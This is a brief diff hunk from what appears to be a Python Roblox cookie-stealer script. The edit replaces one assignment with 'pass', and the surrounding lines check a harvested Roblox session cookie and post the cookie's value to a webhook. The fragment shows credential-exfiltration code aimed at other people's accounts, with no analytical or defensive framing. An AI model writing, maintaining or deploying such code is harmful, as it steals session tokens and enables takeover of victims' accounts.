@@ -86,7 +86,7 @@ roblox_cookie = cookies[1]
 #################### checking cookie #############
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
-    isvalid = "Valid"
+    pass
 else:
     requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
     exit()
